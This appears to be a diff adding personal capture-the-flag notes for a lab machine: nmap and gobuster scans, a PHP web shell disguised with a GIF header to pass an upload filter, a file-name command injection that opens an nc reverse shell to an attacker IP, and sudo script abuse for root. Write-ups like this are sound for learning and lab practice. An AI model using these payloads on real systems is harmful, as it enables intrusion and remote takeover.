@@ -1,0 +1,23 @@
+nmap -sV -sC -Pn 10.129.142.13 > nmap.txt
+nmap -p- 10.129.142.13 > nmapall.txt
+
+gobuster dir  -u http://10.129.142.13/ -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+
+
+echo GIF8 123132 > revers.jpg
+echo  '<?php system($_GET["cmd"]);?>'  >> revers.jpg
+
+
+
+1.nmap 發現80端口
+2.gobuster發現uploads及photos.php
+3.uploads.php可以上傳檔案,文檔前插入GIT8 可以騙過驗證(Magic驗證方式)
+4.檔案上傳時添加後綴reverse.php.gif
+5.發現/home/guly下有定時任務腳本attack.php
+6.發現下面可以透過檔案名稱中斷指令執行shell
+7.創建如下檔案名稱可執行ping
+';nc -c bash 10.10.14.45 4444");}}?>'
+8.取得guly用戶後,有root權限執行腳本
+(root) NOPASSWD: /usr/local/sbin/changename.sh
+9.腳本最後會執行ifup的命令,該命令會source配置的
+10可以透過輸入input給予格後bash,取的root shell
